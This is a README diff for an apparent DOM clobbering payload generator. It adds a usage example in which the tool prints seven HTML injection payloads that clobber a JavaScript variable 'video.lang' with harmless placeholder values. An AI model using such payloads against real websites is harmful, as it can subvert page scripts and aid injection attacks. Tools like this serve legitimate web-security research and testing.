@@ -4,7 +4,30 @@ Full article on [OffensiveWeb](https://www.offensiveweb.com/docs/topics/dom-clob
 
 ## Usage
 
-TODO
+```bash
+$ python3 generator.py video.lang 'Hello!'
+********************* INFO **********************
+ALLOWED_ELEMENTS = ['a', 'form', 'input', 'iframe']
+variable_name = 'video.lang'
+variable_value = 'Hello!'
+depth = 2
+document_scope = False
+chrome_required = True
+******************** PAYLOAD #1 ********************
+<a id="video" lang="Hello!"></a>
+******************** PAYLOAD #2 ********************
+<form id="video" lang="Hello!"></form>
+******************** PAYLOAD #3 ********************
+<form name="video" lang="Hello!"></form>
+******************** PAYLOAD #4 ********************
+<input id="video" lang="Hello!"></input>
+******************** PAYLOAD #5 ********************
+<iframe id="video" lang="Hello!"></iframe>
+******************** PAYLOAD #6 ********************
+<iframe name="video" lang="Hello!"></iframe>
+******************** PAYLOAD #7 ********************
+<a id="video"></a><a id="video" name="lang" href="a:Hello!"></a>
+```
 
 ## attributes.json 
 
